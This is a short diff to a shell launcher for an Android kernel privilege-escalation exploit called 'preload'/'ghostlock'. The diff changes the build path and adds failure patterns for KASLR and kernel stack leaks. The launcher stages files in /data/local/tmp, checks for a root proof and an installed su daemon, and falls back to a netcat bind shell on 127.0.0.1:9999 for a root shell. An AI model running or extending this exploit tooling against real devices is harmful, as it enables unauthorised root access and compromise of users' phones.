@@ -1,13 +1,13 @@
 #!/bin/sh
 EXPLOIT_NAME=preload
-EXPLOIT_BUILD=build/${PROJECT:-raspite}/bin/preload
+EXPLOIT_BUILD=build/${PROJECT:-quartz}/bin/preload
 REMOTE_DIR=/data/local/tmp
 LOG=$REMOTE_DIR/ghostlock.log
 CLEAN="$REMOTE_DIR/ghostlock.proof $LOG"
 CAN_EXEC=0
 IS_ROOTED="grep -q ROOTED $REMOTE_DIR/ghostlock.proof"
 IS_READY="grep -aqE 'Su daemon ready|Su install failed' $LOG"
-HAS_FAILED="grep -aqE 'Slide kaslr leak failed|abandoning boot|no ionroot near newest|write did not land' $LOG"
+HAS_FAILED="grep -aqE 'Slide kaslr leak failed|abandoning boot|no ionroot near newest|write did not land|did not resolve ionroot|kernel stack leak failed' $LOG"
 ROOT_SHELL="if command -v su >/dev/null 2>&1; then exec su; fi; echo 'su is unavailable, using the bind shell on 127.0.0.1:9999'; stty raw -echo 2>/dev/null; exec nc 127.0.0.1 9999"
 DEFAULT_TRIES=8
 DEFAULT_SETTLE=3
